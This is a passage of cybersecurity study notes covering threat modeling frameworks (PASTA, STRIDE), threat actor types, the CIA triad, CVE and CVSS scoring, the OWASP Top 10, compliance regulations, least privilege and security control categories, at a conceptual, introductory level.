    -   Vulnerability + Threat.

    -   Likelihood x Impact.

-   **Exploit**: Taking advantage of a vulnerability (risk actualized).

-   **Attack Surface**: term for all the potential system
    vulnerabilities that a threat actor could exploit.

### Six Steps of threat modeling

![The six steps of a threat modeling exercise shown as a
cycle.](media/image577.png){width="6.5in" height="3.654861111111111in"}

In general, there are six steps of a threat model.

1.  The first is to **define the scope** of the model. At this stage,
    the team determines what they\'re building by creating an inventory
    of assets and classifying them.

2.  The second step is to **identify threats**. Here, the team defines
    all potential threat actors. A threat actor is any person or group
    who presents a security risk. Threat actors are characterized as
    being internal or external. For example, an internal threat actor
    could be an employee who intentionally expose an asset to harm. An
    example of an external threat actor could be a malicious hacker, or
    a competing business.

After threat actors have been identified, the team puts together what\'s
known as **an attack tree**. An attack tree is a diagram that maps
threats to assets. The team tries to be as detailed as possible when
constructing this diagram before moving on.

3.  Step three of the threat modeling process is to **characterize the
    environment**. Here, the team applies an attacker mindset to the
    business. They consider how the customers and employees interact
    with the environment. Other factors they consider are external
    partners and third party vendors.

4.  At step four, their objective is to **analyze threats**. Here, the
    team works together to examine existing protections and identify
    gaps. They then rank threats according to their risk score that they
    assign.

5.  During step five, the team decides how to **mitigate risk**. At this
    point, the group creates their plan for defending against threats.
    The choices here are to avoid risk, transfer it, reduce it, or
    accept it.

6.  The sixth and final step is to **evaluate findings**. At this stage,
    everything that was done during the exercise is documented, fixes
    are applied, and the team makes note of any successes they had. They
    also record any lessons learned, so they can inform how they
    approach future threat models.

### Threat Modeling Frameworks

When performing threat modeling, there are multiple methods that can be
used, such as:

-   STRIDE

-   PASTA

-   Trike

-   VAST

Organizations might use any one of these to gather intelligence and make
decisions to improve their security posture. Ultimately, the "right"
model depends on the situation and the types of risks an application
might face.

#### PASTA

The **Process of Attack Simulation and Threat Analysis** (PASTA) is a
risk-centric threat modeling process developed by two OWASP leaders and
supported by a cybersecurity firm called VerSprite. Its main focus is to
discover evidence of viable threats and represent this information as a
model. PASTA\'s evidence-based design can be applied when threat
modeling an application or the environment that supports that
application. Its seven stage process consists of various activities that
incorporate relevant security artifacts of the environment, like
vulnerability assessment reports.

##### Seven Steps of PASTA Framework

PASTA is a popular threat modeling framework that\'s used across many
industries. PASTA is short for Process for Attack Simulation and Threat
Analysis. There are seven stages of the PASTA framework. Let\'s go
through each of them to help this fitness company get their app ready.

1.  Stage one of the PASTA threat model framework is to **[define
    business and security]{.underline} objectives**. Before starting the
    threat model, the team needs to decide what their goals are. The
    main objective in our example with the fitness company app is
    protecting customer data. The team starts by asking a lot of
    questions at this stage. They\'ll need to understand things like how
    personally identifiable information is handled. Answering these
    questions is a key to evaluate the impact of threats that they\'ll
    find along the way.

2.  Stage two of the PASTA framework is to **[define the technical
    scope]{.underline}**. Here, the team\'s focus is to identify the
    application components that must be evaluated. This is what we
    discussed earlier as the attack surface. For a mobile app, this will
    include technology that\'s involved while data is at rest and in
    use. This includes network protocols, security controls, and other
    data interactions.

3.  At stage three of PASTA, the team\'s job is to **[decompose the
    application]{.underline}**. In other words, we need to identify the
    existing controls that will protect user data from threats. This
    normally means working with the application developers to produce a
    data flow diagram. A diagram like this will show how data gets from
    a user\'s device to the company\'s database. It would also identify
    the controls in place to protect this data along the way.

4.  Stage four of PASTA is next. The focus here is to **[perform a
    threat analysis]{.underline}**. This is where the team gets into
    their attacker mindset. Here, research is done to collect the most
    up-to-date information on the type of attacks being used. Like other
    technologies, mobile apps have many attack vectors. These change
    regularly, so the team would reference resources to stay up-to-date.

5.  Stage five of PASTA is **[performing a vulnerability
    analysis]{.underline}**. In this stage, the team more deeply
    investigates potential vulnerabilities by considering the root of
    the problem.

6.  Next is stage six of PASTA, where the team conducts **[attack
    modeling]{.underline}**. This is where the team tests the
    vulnerabilities that were analyzed in stage five by simulating
    attacks. The team does this by creating an attack tree, which looks
    like a flow chart. For example, an attack tree for our mobile app
    might look like this. Customer information, like user names and
    passwords, is a target. This data is normally stored in a database.
    We\'ve learned that databases are vulnerable to attacks like SQL
    injection. So we will add this attack vector to our attack tree. A
    threat actor might exploit vulnerabilities caused by unsanitized
    inputs to attack this vector. The security team uses attack trees
    like this to identify attack vectors that need to be tested to
    validate threats. This is just one branch of this attack tree. An
    application, like a fitness app, typically has lots of branches with
    a number of other attack vectors.

7.  Stage seven of PASTA is to **[analyze risk and
    impact]{.underline}**. Here, the team assembles all the information
    they\'ve collected in stages one through six. By this stage, the
    team is in position to make informed risk management recommendations
    to business stakeholders that align with their goals.

#### STRIDE 

STRIDE is a threat-modeling framework developed by Microsoft. It's
commonly used to identify vulnerabilities in six specific attack
vectors. The acronym represents each of these vectors: spoofing,
tampering, repudiation, information disclosure, denial of service, and
elevation of privilege.

#### Trike 

Trike is an open source methodology and tool that takes a
security-centric approach to threat modeling. It\'s commonly used to
focus on security permissions, application use cases, privilege models,
and other elements that support a secure environment.

#### VAST

The Visual, Agile, and Simple Threat (VAST) Modeling framework is part
of an automated threat-modeling platform called ThreatModeler®. Many
security teams opt to use VAST as a way of automating and streamlining
their threat modeling assessments.

### Threat actor types

Previously, you were introduced to the concept of threat actors. As a
reminder, a **threat actor** is any person or group who presents a
security risk. In this reading, you'll learn about different types of
threat actors. You will also learn about their motivations, intentions,
and how they've influenced the security industry.

![Diagram Description automatically
generated](media/image578.png){width="6.5in"
height="3.672222222222222in"}

Vandal/hacker is an umbrella term which can also be a script kiddie.

![A picture containing text, font, screenshot Description automatically
generated](media/image579.png){width="5.488897637795276in"
height="3.7807775590551183in"}

#### Advanced persistent threats

Advanced persistent threats (APTs) have significant expertise accessing
an organization\'s network without authorization. APTs tend to research
their targets (e.g., large corporations or government entities)  in
advance and can remain undetected for an extended period of time. Their
intentions and motivations can include:

-   Damaging critical infrastructure, such as the power grid and natural
    resources

-   Gaining access to intellectual property, such as trade secrets or
    patents

#### Insider threats

Insider threats abuse their authorized access to obtain data that may
harm an organization. Their intentions and motivations can include: 

-   Sabotage

-   Corruption

-   Espionage

-   Unauthorized data access or leaks 

#### Organized Crime

Hackers who are part of a crime group that is well-funded and highly
sophisticated.

#### Hacktivists

Hacktivists are threat actors that are driven by a political agenda.
They abuse digital technology to accomplish their goals, which may
include: 

-   Demonstrations

-   Propaganda

-   Social change campaigns

-   Fame

#### Script Kiddies

Hackers with little to no skill who only use the tools and exploits
written by others.

### Hacker types

![Six hackers on computers.](media/image580.png){width="6.5in"
height="2.5229166666666667in"}

A **hacker** is any person who uses computers to gain access to computer
systems, networks, or data. They can be beginner or advanced technology
professionals who use their skills for a variety of reasons. There are
three main categories of hackers:

-   Authorized hackers are also called ethical hackers. They follow a
    code of ethics and adhere to the law to conduct organizational risk
    evaluations. They are motivated to safeguard people and
    organizations from malicious threat actors.

-   Semi-authorized hackers are considered researchers. They search for
    vulnerabilities but don't take advantage of the vulnerabilities they
    find.

-   Unauthorized hackers are also called unethical hackers. They are
    malicious threat actors who do not follow or respect the law. Their
    goal is to collect and sell confidential data for financial gain. 

**Note:** There are multiple hacker types that fall into one or more of
these three categories.

**[Five Types of Hackers]{.underline}**

-   White Hats

    -   Non-malicious hackers who attempt to break into a company's
        systems at their request

-   Black Hats

    -   Malicious hackers who break into computer systems and networks
        without authorization or permission

-   Gray Hats

    -   Hackers without any affiliation to a company who attempt to
        break into a company's network but risk the law by doing so

-   Blue Hats

    -   Hackers who attempt to hack into a network with permission of
        the company but are not employed by the company

-   Elite

    -   Hackers who find and exploit vulnerabilities before anyone else
        does

    -   1 in 10,000 are elite

-   Script kiddies have limited skill and only run other people's
    exploits and tools

### Threat Trees

![A picture containing radar chart Description automatically
generated](media/image581.png){width="6.5in"
height="3.098611111111111in"}

### CIA (CIA Triad)

Three standard types of threats

-   **Confidentiality**: An attack of disclosure -- where some data is
    no longer confidential.

-   **Integrity**: An attack on the integrity of some data.

-   **Availability**: An attack limiting/stopping availability of some
    service.

-   ***Fraud (arguable)**: Taking/using some products/service without
    paying for it.*

![Diagram Description automatically
generated](media/image582.png){width="6.5in"
height="3.379166666666667in"}

![Shape Description automatically
generated](media/image583.png){width="3.131541994750656in"
height="3.0603707349081364in"}

#### CIA Threat Types

A threat is just the possibility of danger/attack.

![Diagram Description automatically
generated](media/image584.png){width="4.7402449693788276in"
height="3.6463418635170606in"}

##### Confidentiality Threat

\"Confidentiality,\" in this context, means preventing unauthorized
third parties from gaining access to the data.

![Text Description automatically
generated](media/image585.png){width="4.834008092738408in"
height="2.354494750656168in"}

##### Integrity Threat

\"Integrity,\" in this context, means ensuring that the data remains
intact, uncorrupted, and not tampered with. The data that gets sent is
the exact same as the data that gets received.

![Graphical user interface, text, application Description automatically
generated](media/image586.png){width="5.459095581802274in"
height="2.239896106736658in"}

Buffer Overflow

![Chart Description automatically generated with medium
confidence](media/image587.png){width="6.5in"
height="3.2881944444444446in"}

![Diagram Description automatically
generated](media/image588.png){width="6.5in"
height="3.4541666666666666in"}

![Chart Description automatically
generated](media/image589.png){width="6.5in"
height="3.4451388888888888in"}

![Text Description automatically
generated](media/image590.png){width="3.684802055993001in"
height="1.1031419510061242in"}

![Text Description automatically
generated](media/image591.png){width="6.5in"
height="3.1618055555555555in"}

##### Availability Threat

\"Availability,\" in this context, means ensuring that data and services
remain accessible to those who are authorized to access them.

![Text Description automatically
generated](media/image592.png){width="4.823590332458442in"
height="2.3961679790026245in"}

![Diagram, schematic Description automatically
generated](media/image593.png){width="6.5in"
height="3.245833333333333in"}

![Diagram Description automatically
generated](media/image594.png){width="6.5in"
height="3.6645833333333333in"}

##### Fraud Threat

Dr. Edward G. Amoroso, CEO of TAG Cyber, a global cybersecurity company.
He is a distinguished research professor in computer science and
engineering at NYU Tandon.

![Text Description automatically
generated](media/image595.png){width="5.073624234470691in"
height="2.531603237095363in"}

### Threat/Asset Matrix

![Table Description automatically
generated](media/image596.png){width="6.5in"
height="3.5881944444444445in"}

Each cell corresponds to a risk assessment of some sort. Each cell can
be broken down into its own threat tree.

**Risk** is estimated based on two contributing factors: (1) How likely
is it that some security attack will occur? (2) What are the
consequences if such attack were to occur?

![Diagram Description automatically
generated](media/image597.png){width="6.5in"
height="3.545138888888889in"}

![Diagram Description automatically
generated](media/image598.png){width="6.5in"
height="4.548611111111111in"}

Each of these seven assets for example, can have its own asset matrix --
where each such cell has its own threat tree (potentially).

**Risk Assessment example (contd.)**

![Table Description automatically
generated](media/image599.png){width="6.5in"
height="3.7104166666666667in"}

![Text Description automatically generated with medium
confidence](media/image600.png){width="4.226774934383202in"
height="4.154974846894138in"}

![Diagram Description automatically generated with medium
confidence](media/image601.png){width="5.451611986001749in"
height="3.0234317585301835in"}

Note doctor analogy. Best to start with Assets & threats which are
finite than Vulnerabilities & attacks which are infinite.

![A picture containing diagram Description automatically
generated](media/image602.png){width="6.5in"
height="4.620138888888889in"}

## Finding Vulnerabilities

### Vulnerability Types

![Chart, bubble chart Description automatically generated with medium
confidence](media/image603.png){width="4.771499343832021in"
height="3.708850612423447in"}

![Graphical user interface, text Description automatically generated
with medium confidence](media/image604.png){width="4.068535651793526in"
height="2.0581747594050745in"}

The \"zero\" in zero-day vulnerability means that there\'s been zero
days for the vulnerability to be fixed, but it\'s been exploited by
attackers already.

![Graphical user interface, text, application Description automatically
generated](media/image605.png){width="4.1844772528433944in"
height="1.1431321084864392in"}

A vulnerability is a bug or hole in a system. It allows an attacker to
gain access by using an exploit, which takes advantage of the
vulnerability.

![Graphical user interface, text Description automatically
generated](media/image606.png){width="6.5in" height="3.2in"}

![Graphical user interface, text, application Description automatically
generated](media/image607.png){width="6.5in" height="3.7875in"}

![Graphical user interface, text Description automatically
generated](media/image608.png){width="6.5in"
height="5.365277777777778in"}

![Graphical user interface, text, application Description automatically
generated](media/image609.png){width="6.5in"
height="3.089583333333333in"}

### OSINT Tools (Open Source Intelligence)

There\'s an enormous amount of open-source information online. Finding
relevant information that can be used to gather intelligence is a
challenge. Information can be gathered from a variety of sources, such
as search engines, social media, discussion boards, blogs, and more.
Several tools also exist that can be used in your intelligence gathering
process. Here are just a few examples of tools that you can explore:

-   [VirusTotal](https://www.virustotal.com/gui/home/upload) is a
    service that allows anyone to analyze suspicious files, domains,
    URLs, and IP addresses for malicious content.

-   [MITRE ATT&CK®](https://attack.mitre.org/) is a knowledge base of
    adversary tactics and techniques based on real-world observations.

-   [OSINT Framework](https://osintframework.com/) is a web-based
    interface where you can find OSINT tools for almost any kind of
    source or platform.

-   [Have I been Pwned](https://haveibeenpwned.com/) is a tool that can
    be used to search for breached email accounts.

There are numerous other OSINT tools that can be used to find specific
types of information. Remember, information can be gathered from a
variety of sources. Ultimately, it\'s your responsibility to thoroughly
research any available information that\'s relevant to the problem
you're trying to solve.

### McAfee Threat Report

![Chart, pie chart Description automatically
generated](media/image610.png){width="6.5in"
height="5.482638888888889in"}

### CVE (Common Vulnerabilities and Exposures list) and NVD

We\'ve discussed before that security is a team effort. Did you know the
group extends well beyond a single security team? Protecting information
is a global effort!

When it comes to vulnerabilities, there are actually online public
libraries. Individuals and organizations use them to share and document
common vulnerabilities and exposures. We\'ve been focusing a lot on
vulnerabilities. Exposures are similar, but they have a key difference.
While a vulnerability is a weakness of a system, an exposure is a
mistake that can be exploited by a threat.

For example, imagine you\'re asked to protect an important document.
Documents are vulnerable to being misplaced. If you laid the document
down near an open window, it could be exposed to being blown away.

One of the most popular libraries of vulnerabilities and exposures is
the CVE list. The **common vulnerabilities and exposures list**, or CVE
list, is an openly accessible dictionary of known vulnerabilities and
exposures. It is a popular resource.

Many organizations use a CVE list to find ways to improve their
defenses. The CVE list was originally created by MITRE corporation in
1999. MITRE is a collection of non-profit research and development
centers. They\'re sponsored by the US government. Their focus is on
improving security technologies around the world.

The main purpose of the CVE list is to offer a standard way of
identifying and categorizing known vulnerabilities and exposures. Most
CVEs in the list are reported by independent researchers, technology
vendors, and ethical hackers, but anyone can report one. Before a CVE
can make it onto the CVE list, it first goes through a strict review
process by a **CVE Numbering Authority**, or **CNA**.

A CNA is an organization that volunteers to analyze and distribute
information on eligible CVEs. All of these groups have an established
record of researching vulnerabilities and demonstrating security
advisory capabilities. When a vulnerability or exposure is reported to
them, a rigorous testing process takes place.

[The CVE list tests four criteria that a vulnerability must have before
it\'s assigned an ID.]{.underline}

1.  First, it must be independent of other issues. In other words, the
    vulnerability should be able to be fixed without having to fix
    something else.

2.  Second, it must be recognized as a potential security risk by
    whoever reports it. Third, the vulnerability must be submitted with
    supporting evidence.

3.  And finally, the reported vulnerability can only affect one
    codebase, or in other words, only one program\'s source code. For
    instance, the desktop version of Chrome may be vulnerable, but the
    Android application may not be. If the reported flaw passes all of
    these tests, it is assigned a CVE ID.

#### Scoring CVE Vulnerabilities

Vulnerabilities added to the CVE list are often reviewed by other online
vulnerability databases. These organizations put them through additional
tests to reveal how significant the flaws are and to determine what kind
of threat they pose. One of the most popular is the **NIST National
Vulnerabilities Database**.

The NIST National Vulnerabilities Database uses what\'s known as the
common vulnerability scoring system, or CVSS, which is a measurement
system that scores the severity of a vulnerability. Security teams use
**CVSS** as a way of calculating the impact a vulnerability could have
on a system. They also use them to determine how quickly a vulnerability
should be patched.

[The NIST National Vulnerabilities Database provides a base score of
CVEs on a scale of 0-10]{.underline}. Base scores reflect the moment a
vulnerability is evaluated, so they don\'t change over time. In general,
a CVSS that scores below a 4.0 is considered to be low risk and doesn\'t
require immediate attention. However, anything above a 9.0 is considered
to be a critical risk to company assets that should be addressed right
away.

Security teams commonly use the CVE list and CVSS scores as part of
their vulnerability management strategy. These references provide
recommendations for prioritizing security fixes, like installing
software updates before patches.

Libraries like the CVE list, help organizations answer questions. Is a
vulnerability dangerous to our business? If so, how soon should we
address it?

### The OWASP Top 10 Vulnerabilities

To prepare for future risks, security professionals need to stay
informed. Previously, you learned about the **CVE® list**, an openly
accessible dictionary of known vulnerabilities and exposures. The CVE®
list is an important source of information that the global security
community uses to share information with each other.

In this reading, you'll learn about another important resource that
security professionals reference, the Open Web Application Security
Project, recently renamed Open Worldwide Application Security Project®
(OWASP). You'll learn about OWASP's role in the global security
community and how companies use this resource to focus their efforts.

#### What is OWASP?

OWASP is a nonprofit foundation that works to improve the security of
software. OWASP is an open platform that security professionals from
around the world use to share information, tools, and events that are
focused on securing the web.

#### The OWASP Top 10

One of OWASP's most valuable resources is the OWASP Top 10. The
organization has published this list since 2003 as a way to spread
awareness of the web's most targeted vulnerabilities. The Top 10 mainly
applies to new or custom made software. Many of the world\'s largest
organizations reference the OWASP Top 10 during application development
to help ensure their programs address common security mistakes.

**Pro tip:** OWASP's Top 10 is updated every few years as technologies
evolve. Rankings are based on how often the vulnerabilities are
discovered and the level of risk they present.

**Note:** Auditors also use the OWASP Top 10 as one point of reference
when checking for regulatory compliance.

**Common vulnerabilities**

Businesses often make critical security decisions based on the
vulnerabilities listed in the OWASP Top 10. This resource influences how
businesses design new software that will be on their network, unlike the
CVE® list, which helps them identify improvements to existing programs.
These are the most regularly listed vulnerabilities that appear in their
rankings to know about:

##### Broken access control

Access controls limit what users can do in a web application. For
example, a blog might allow visitors to post comments on a recent
article but restricts them from deleting the article entirely. Failures
in these mechanisms can lead to unauthorized information disclosure,
modification, or destruction. They can also give someone unauthorized
access to other business applications.

##### Cryptographic failures

Information is one of the most important assets businesses need to
protect. Privacy laws such as General Data Protection Regulation (GDPR)
require sensitive data to be protected by effective encryption methods.
Vulnerabilities can occur when businesses fail to encrypt things like
personally identifiable information (PII). For example, if a web
application uses a weak hashing algorithm, like MD5, it's more at risk
of suffering a data breach.

##### Injection

Injection occurs when malicious code is inserted into a vulnerable
application. Although the app appears to work normally, it does things
that it wasn't intended to do. Injection attacks can give threat actors
a backdoor into an organization's information system. A common target is
a website's login form. When these forms are vulnerable to injection,
attackers can insert malicious code that gives them access to modify or
steal user credentials.

##### Insecure design

Applications should be designed in such a way that makes them resilient
to attack. When they aren't, they're much more vulnerable to threats
like injection attacks or malware infections. Insecure design refers to
a wide range of missing or poorly implemented security controls that
should have been programmed into an application when it was being
developed.

##### Security misconfiguration

Misconfigurations occur when security settings aren't properly set or
maintained. Companies use a variety of different interconnected systems.
Mistakes often happen when those systems aren't properly set up or
audited. A common example is when businesses deploy equipment, like a
network server, using default settings. This can lead businesses to use
settings that fail to address the organization\'s security objectives.

##### Vulnerable and outdated components

Vulnerable and outdated components is a category that mainly relates to
application development. Instead of coding everything from scratch, most
developers use open-source libraries to complete their projects faster
and easier. This publicly available software is maintained by
communities of programmers on a volunteer basis. Applications that use
vulnerable components that have not been maintained are at greater risk
of being exploited by threat actors.

##### Identification and authentication failures

Identification is the keyword in this vulnerability category. When
applications fail to recognize who should have access and what they're
authorized to do, it can lead to serious problems. For example, a home
Wi-Fi router normally uses a simple login form to keep unwanted guests
off the network. If this defense fails, an attacker can invade the
homeowner's privacy.

##### Software and data integrity failures

Software and data integrity failures are instances when updates or
patches are inadequately reviewed before implementation. Attackers might
exploit these weaknesses to deliver malicious software. When that
occurs, there can be serious downstream effects. Third parties are
likely to become infected if a single system is compromised, an event
known as a supply chain attack.

A famous example of a supply chain attack is the [SolarWinds cyber
attack
(2020)](https://www.gao.gov/blog/solarwinds-cyberattack-demands-significant-federal-and-private-sector-response-infographic)
where hackers injected malicious code into software updates that the
company unknowingly released to their customers.

##### Security logging and monitoring failures

In security, it's important to be able to log and trace back events.
Having a record of events like user login attempts is critical to
finding and fixing problems. Sufficient monitoring and incident response
is equally important.

##### Server-side request forgery

Companies have public and private information stored on web servers.
When you use a hyperlink or click a button on a website, a request is
sent to a server that should validate who you are, fetch the appropriate
data, and then return it to you.

![A hacker using their victim\'s computer to steal data from a web
server.](media/image611.png){width="6.5in"
height="3.5131944444444443in"}

Server-side request forgeries (SSRFs) are when attackers manipulate the
normal operations of a server to read or update other resources on that
server. These are possible when an application on the server is
vulnerable. Malicious code can be carried by the vulnerable app to the
host server that will fetch unauthorized data.

### Compliance Standards

Previously, you were introduced to security frameworks and how they
provide a structured approach to implementing a security lifecycle. As a
reminder, a security lifecycle is a constantly evolving set of policies
and standards. In this reading, you will learn more about how security
frameworks, controls, and compliance regulations---or laws---are used
together to manage security and make sure everyone does their part to
minimize risk.

The **confidentiality, integrity, and availability (CIA) triad** is a
model that helps inform how organizations consider risk when setting up
systems and security policies. 

![A triangle representing the CIA (confidentiality, integrity,
availability) triad](media/image612.png){width="6.5in"
height="3.5909722222222222in"}

CIA are the three foundational principles used by cybersecurity
professionals to establish appropriate controls that mitigate threats,
risks, and vulnerabilities.

As you may recall, **security** **controls** are safeguards designed to
reduce specific security risks. So they are used alongside frameworks to
ensure that security goals and processes are implemented correctly and
that organizations meet regulatory compliance requirements.

**Compliance** is the process of adhering to internal standards and
external regulations.

#### The Federal Energy Regulatory Commission - North American Electric Reliability Corporation (FERC-NERC)

FERC-NERC is a regulation that applies to organizations that work with
electricity or that are involved with the U.S. and North American power
grid. These types of organizations have an obligation to prepare for,
mitigate, and report any potential security incident that can negatively
affect the power grid. They are also legally required to adhere to the
Critical Infrastructure Protection (CIP) Reliability Standards defined
by the FERC. 

#### The Federal Risk and Authorization Management Program (FedRAMP®)

FedRAMP is a U.S. federal government program that standardizes security
assessment, authorization, monitoring, and handling of cloud services
and product offerings. Its purpose is to provide consistency across the
government sector and third-party cloud providers. 

#### Center for Internet Security (CIS®)

CIS is a nonprofit with multiple areas of emphasis. It provides a set of
controls that can be used to safeguard systems and networks against
attacks. Its purpose is to help organizations establish a better plan of
defense. CIS also provides actionable controls that security
professionals may follow if a security incident occurs. 

#### General Data Protection Regulation (GDPR)

GDPR is a European Union (E.U.) general data regulation that protects
the processing of E.U. residents' data and their right to privacy in and
out of E.U. territory. For example, if an organization is not being
transparent about the data they are holding about an E.U. citizen and
why they are holding that data, this is an infringement that can result
in a fine to the organization. Additionally, if a breach occurs and an
E.U. citizen's data is compromised, they must be informed. The affected
organization has 72 hours to notify the E.U. citizen about the breach.

#### Payment Card Industry Data Security Standard (PCI DSS)

PCI DSS is an international security standard meant to ensure that
organizations storing, accepting, processing, and transmitting credit
card information do so in a secure environment. The objective of this
compliance standard is to reduce credit card fraud. 

#### The Health Insurance Portability and Accountability Act (HIPAA)

HIPAA is a U.S. federal law established in 1996 to protect patients\'
health information. This law prohibits patient information from being
shared without their consent. It is governed by three rules: 

1.  Privacy

2.  Security 

3.  Breach notification 

Organizations that store patient data have a legal obligation to inform
patients of a breach because if patients\' **Protected Health
Information** (PHI) is exposed, it can lead to identity theft and
insurance fraud. PHI relates to the past, present, or future physical or
mental health or condition of an individual, whether it's a plan of care
or payments for care. Along with understanding HIPAA as a law, security
professionals also need to be familiar with the Health Information Trust
Alliance (HITRUST®), which is a security framework and assurance program
that helps institutions meet HIPAA compliance.

#### International Organization for Standardization (ISO) 

ISO was created to establish international standards related to
technology, manufacturing, and management across borders. It helps
organizations improve their processes and procedures for staff
retention, planning, waste, and services. 

#### System and Organizations Controls (SOC type 1, SOC type 2)

The American Institute of Certified Public Accountants® (AICPA) auditing
standards board developed this standard. The SOC1 and SOC2 are a series
of reports that focus on an organization\'s user access policies at
different organizational levels such as: 

-   Associate

-   Supervisor

-   Manager

-   Executive

-   Vendor

-   Others 

They are used to assess an organization's financial compliance and
levels of risk. They also cover confidentiality, privacy, integrity,
availability, security, and overall data safety. Control failures in
these areas can lead to fraud.

**Pro tip**: There are a number of regulations that are frequently
revised. You are encouraged to keep up-to-date with changes and explore
more frameworks, controls, and compliance. Two suggestions to research:
the Gramm-Leach-Bliley Act and the Sarbanes-Oxley Act.

#### United States Presidential Executive Order 14028

On May 12, 2021, President Joe Biden released an executive order related
to improving the nation's cybersecurity to remediate the increase in
threat actor activity. Remediation efforts are directed toward federal
agencies and third parties with ties to U.S. [critical
infrastructure](https://csrc.nist.gov/glossary/term/critical_infrastructure#:~:text=Definition(s)%3A,any%20combination%20of%20those%20matters.).
For additional information, review the [Executive Order on Improving the
Nation's
Cybersecurity](https://www.whitehouse.gov/briefing-room/presidential-actions/2021/05/12/executive-order-on-improving-the-nations-cybersecurity/).

### Security Controls

#### Principle of Least privilege

To maintain privacy, security controls are intended to limit access
based on the user and situation. This is known as the **[principle of
least privilege]{.underline}**. Security controls should be designed
with the principle of least privilege in mind. When they are, they rely
on differentiating between data owners and data custodians.

A **data owner** is a person who decides who can access, edit, use, or
destroy their information.

The idea is very straightforward except in cases where there are
multiple owners. For example, the intellectual property of an
organization can have multiple data owners.

A **data custodian** is anyone or anything that\'s responsible for the
safe handling, transport, and storage of information.

Did you notice that I mentioned, \"anything?\" That\'s because, aside
from people, organizations and their systems are also custodians of
people\'s information.

##### Limiting access reduces risk

Every business needs to plan for the risk of data theft, misuse, or
abuse. Implementing the principle of least privilege can greatly reduce
the risk of costly incidents like data breaches by:

-   Limiting access to sensitive information

-   Reducing the chances of accidental data modification, tampering, or
    loss

-   Supporting system monitoring and administration

Least privilege greatly reduces the likelihood of a successful attack by
connecting specific resources to specific users and placing limits on
what they can do. It\'s an important security control that should be
applied to any asset. Clearly defining who or what your users are is
usually the first step of implementing least privilege effectively.

**Note:** Least privilege is closely related to another fundamental
security principle, the *separation of duties---*a security concept that
divides tasks and responsibilities among different users to prevent
giving a single user complete control over critical business functions.
You\'ll learn more about separation of duties in a different reading
about identity and access management.

##### Determining access and authorization

To implement least privilege, access and authorization must be
determined first. There are two questions to ask to do so: 

-   Who is the user? 

-   How much access do they need to a specific resource? 

Determining who the user is usually straightforward. A user can refer to
a person, like a customer, an employee, or a vendor. It can also refer
to a device or software that\'s connected to your business network. In
general, every user should have their own account. Accounts are
typically stored and managed within an organization\'s directory
service.

These are the most common types of user accounts:

-   **Guest accounts** are provided to external users who need to access
    an internal network, like customers, clients, contractors, or
    business partners.

-   **User accounts** are assigned to staff based on their job duties.

-   **Service accounts** are granted to applications or software that
    needs to interact with other software on the network.

-   **Privileged accounts** have elevated permissions or administrative
    access.

It\'s best practice to determine a baseline access level for each
account type before implementing least privilege. However, the
appropriate access level can change from one moment to the next. For
example, a customer support representative should only have access to
your information while they are helping you. Your data should then
become inaccessible when the support agent starts working with another
customer and they are no longer actively assisting you. Least privilege
can only reduce risk if user accounts are routinely and consistently
monitored.

**Pro tip:** Passwords play an important role when implementing the
principle of least privilege. Even if user accounts are assigned
appropriately, an insecure password can compromise your systems.

##### Auditing account privileges

Setting up the right user accounts and assigning them the appropriate
privileges is a helpful first step. Periodically auditing those accounts
is a key part of keeping your company's systems secure.

There are three common approaches to auditing user accounts:

-   Usage audits

-   Privilege audits

-   Account change audits

As a security professional, you might be involved with any of these
processes.

##### **Usage audits**

When conducting a usage audit, the security team will review which
resources each account is accessing and what the user is doing with the
resource. Usage audits can help determine whether users are acting in
accordance with an organization's security policies. They can also help
identify whether a user has permissions that can be revoked because they
are no longer being used.

##### **Privilege audits**

Users tend to accumulate more access privileges than they need over
time, an issue known as *privilege creep*. This might occur if an
employee receives a promotion or switches teams and their job duties
change. Privilege audits assess whether a user\'s role is in alignment
with the resources they have access to.

##### **Account change audits**

Account directory services keep records and logs associated with each
user. Changes to an account are usually saved and can be used to audit
the directory for suspicious activity, like multiple attempts to change
an account password. Performing account change audits helps to ensure
that all account changes are made by authorized users.

**Note:** Most directory services can be configured to alert system
administrators of suspicious activity.

#### Security Control categories

Controls within cybersecurity are grouped into three main categories:

-   Administrative/Managerial controls

-   Technical controls

-   Operational/Physical controls

**Administrative/Managerial controls** address the human component of
cybersecurity. These controls include policies and procedures that
define how an organization manages data and clearly defines employee
responsibilities, including their role in protecting the organization.
While administrative controls are typically policy based, the
enforcement of those policies may require the use of technical or
physical controls. User training is the most cost-effective security
control to use.

**Technical controls** consist of solutions such as firewalls, intrusion
detection systems (IDS), intrusion prevention systems (IPS), audio
visual (AV) products, encryption, etc. Technical controls can be used in
a number of ways to meet organizational goals and objectives.

Smart cards, encryption, access control lists (ACLs), intrusion
detection systems, and network authentication

**Physical controls** include door locks, cabinet locks, surveillance
cameras, badge readers, etc. They are used to limit physical access to
physical assets by unauthorized personnel.

#### Control types

There are five types of controls:

1.  Preventative

2.  Corrective

3.  Detective

4.  Deterrent

5.  Compensating

These controls work together to provide defense in depth and protect
assets. **Preventative controls** are designed to prevent an incident
from occurring in the first place. **Corrective controls** are used to
restore an asset after an incident. **Detective controls** are
implemented to determine whether an incident has occurred or is in
progress. **Deterrent controls** are designed to discourage attacks.
And, finally, **compensating controls** are used to fortify the security
of an asset when the current controls aren't enough to adequately
protect the asset.

Review the following charts for specific details about each type of
control and its purpose.

  -----------------------------------------------------------------------
  **Administrative                                
  Controls**                                      
  ----------------------- ----------------------- -----------------------
  **Control Name**        **Control Type**        **Control Purpose**

  Least Privilege         Preventative            Reduce risk and
                                                  [overall impact]{.mark}
                                                  of malicious insider or
                                                  compromised accounts

  Disaster recovery plans Corrective              Provide business
                                                  continuity

  Password policies       Preventative            Reduce likelihood of
                                                  account compromise
                                                  through brute force or
                                                  dictionary attack
                                                  techniques

  Access control policies Preventative            Bolster confidentiality
                                                  and integrity by
                                                  defining which groups
                                                  can access or modify
                                                  data

  Account management      Preventative            Managing account
  policies                                        lifecycle, reducing
                                                  attack surface, and
                                                  limiting [overall
                                                  impact]{.mark} from
                                                  disgruntled former
                                                  employees and default
                                                  account usage

  Separation of duties    Preventative            Reduce risk and
                                                  [overall impact]{.mark}
                                                  of malicious insider or
                                                  compromised accounts
  -----------------------------------------------------------------------

  ----------------------- ----------------------- -----------------------
  **Technical Controls**                          

  **Control Name**        **Control Type**        **Control Purpose**

  Firewall                Preventative            To filter unwanted or
                                                  malicious traffic from
                                                  entering the network

  IDS/IPS                 Detective               To detect and prevent
                                                  anomalous traffic that
                                                  matches a signature or
                                                  rule

  Encryption              Deterrent               Provide confidentiality
                                                  to sensitive
                                                  information

  Backups                 Corrective              Restore/recover from an
